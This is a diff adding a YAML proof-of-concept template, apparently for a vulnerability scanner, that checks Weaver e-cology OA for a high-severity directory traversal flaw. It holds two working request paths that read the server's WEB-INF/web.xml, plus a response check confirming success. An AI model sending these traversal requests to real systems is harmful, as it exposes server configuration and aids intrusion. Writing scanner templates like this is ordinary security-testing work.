@@ -1,0 +1,19 @@
+id: poc-yaml-weaver-ecology-weaver-directory-traversal
+info:
+  name: 泛微OA Ecology Weaver 目录遍历漏洞
+  severity: high
+  tags:
+  - 目录遍历
+  finger: e-cology
+  osprey-id: vb_2020_0031
+variables:
+  r_path: '/weaver/ln.FileDownload?fpath=../ecology/WEB-INF/web.xml
+
+    /weaver/org.springframework.web.servlet.ResourceServlet?resource=/WEB-INF/web.xml'
+requests:
+- method: GET
+  path: '{{.r_path}}'
+  expression: 'status_code == 200 && contains(body, "<url-pattern>/weaver/")
+
+    '
+transport: http
